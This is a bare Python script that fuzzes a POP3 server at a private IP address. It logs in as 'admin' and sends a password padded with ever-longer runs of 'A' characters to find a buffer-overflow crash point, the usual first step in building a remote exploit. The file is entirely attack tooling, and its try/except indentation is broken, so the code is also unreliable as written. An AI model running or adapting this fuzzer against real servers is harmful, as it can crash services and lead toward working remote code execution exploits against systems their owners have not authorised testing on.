import socket

buffer = "A" * 100

while len(buffer) <= 4000:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
  s.connect(('192.168.1.112', 110))
    print('We are fuzzing with a length of %s bytes ' %(len(buffer)))
    data = s.recv(1024)
    s.send('USER admin ' + '\r\n')
    data = s.recv(1024)
   s.send('PASS toor' + buffer + '\r\n')
   data = s.recv(1024)
   s.close()
   print("Done!")
   buffer += "A" * 200
except:
    print ("Could not connect to POP3 for some reason....")	